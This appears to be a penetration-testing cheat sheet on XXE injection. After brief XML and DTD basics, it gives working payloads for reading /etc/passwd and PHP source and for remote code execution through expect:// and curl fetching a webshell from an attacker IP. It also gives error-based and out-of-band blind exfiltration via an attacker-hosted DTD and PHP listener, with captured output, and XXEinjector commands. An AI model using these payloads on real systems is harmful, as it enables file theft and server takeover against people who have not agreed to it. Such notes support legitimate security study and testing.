# What are XXE?
ML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, 
which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, 
from disclosing sensitive files to shutting the back-end server down, which is why it is considered one of the Top 10 Web Security Risks by OWASP.

## XML Elements
```
Tag 			The keys of an XML document, usually wrapped with (</>) characters. 												<date>
Entity 			XML variables, usually wrapped with (&/;) characters. 	&lt;
Element 		The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. 		<date>01-01-2022</date>
Attribute 		Optional specifications for any element that are stored in the tags, which may be used by the XML parser. 			version="1.0"/encoding="UTF-8"
Declaration 	Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it. 		<?xml version="1.0" encoding="UTF-8"?>
```


## XML Entity structure
XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure.
```

<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```
Yhe DTD is declaring the root email element with the ELEMENT type declaration and then denoting its child elements. 
After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by PCDATA).
The above DTD can be placed within the XML document itself, right after the XML Declaration in the first line.

## Defining XML Entities
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
To call the entity: **&ENTITYNAME;**
To call external references use SYSTEM:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```


## XXE LFI
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
(Placed just under declaration)

Find a XML tag that get's reflected in the response.
Call the entity with  **&company;** 


## XXE LFI PHP files(with BASE64 Encoding)
```
<!DOCTYPE email [
  <!ENTITY email SYSTEM "php://filter/convert.base64-encode/resource=FILENAME">
]>
```
(Placed just under declaration )
Find a XML tag that get's reflected in the response.
Call the entity with **&email;** 
Decode the B64 result to get the php source code.


## XXE RCE
1)Prepare a PHP Webshell
2)Host it on your machine with Python3 **http.server**
3)RFI with PHP expect function to get the shell:
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```
(Place just under Declaration, IFS is used to escape spaces as it might break XML code otherwise)
4)Call the Entity in a reflected tag ex: 
```
<email>&company;</email>
```


## XXE Advanced LFI
To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. <![CDATA[ FILE_CONTENT ]]>). 
This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

1)Prepare the dtd: 
```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```
2)Host it locally with python3 -m **http.server**
3)Write the payload just under Declaration:
```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
```
(This will call our external DTD with SYSTEM)
4)Call the Entity in a reflected tag ex: 
```
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```
(OBS: we have to use joined from dtd and not xxe cause xxe only links the dtd hosted on our server)


## XXE Advanced LFI Error Based(Blind)
Same as the one before but "Blind" when APP doesn't answer back with a result.
To Bypass:
1)Try to read a fake entity: `<email>&fake;</email>`
2)If application throws a error verbose then might be vulnerable
3)Prepare the **xxe.dtd**:
```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%fake;/%file;'>">
```
(This joins the LFI with a Fake entity)
4)Host it locally with python3 -m http.server
5)Place this just after Declaration:
```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```


## XXE Out-of-band (OOB) Data Exfiltration (Blind)
This can be used when application is not outputting anything that's why is called "Blind".
The attack is pretty similar to the Error Based but here we won't let back-end print the result, it will be outputted to our PHP web-server instead.
1)Prepare the dtd to execute LFI:
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
(This will BASE64 of the LFI and send the result to Our PHP server listening)
2)Prepare the i**ndex.php** to decode param from B64:
```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
3)Spinup the PHP server:
```
php -S 0.0.0.0:8000
```
(in same folder as **index.php**)
5)Place this just after Declaration:
```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
```
```
(This links to our malicious dtd and calls both lfi and joined oob)
```
6)Place this in the body:
`<root>&content;</root>`
(Here we call the content Entity from dtd that ex-filtrate data to our PHP web-server)
7)You should see something similar:
```
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...

```


## XXE Out-of-band (OOB) Data Exfiltration (Blind)
This is same but automated:

1)git clone https://github.com/enjoiz/XXEinjector
2)Get the request in Burp and edit it by remove whole xml to be something like:
```
<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```
(The XXEInject will be our placeholder for where to inject)
3)Save the request
4)Call the payload: 
```
ruby XXEinjector.rb --oob=http --phpfilter --file=request.req  --path=/LOCAL/FILE/TO/EXFILTRATE --host=OURIP --httpport=9000
```
5)The result will be saved in **./Logs** folder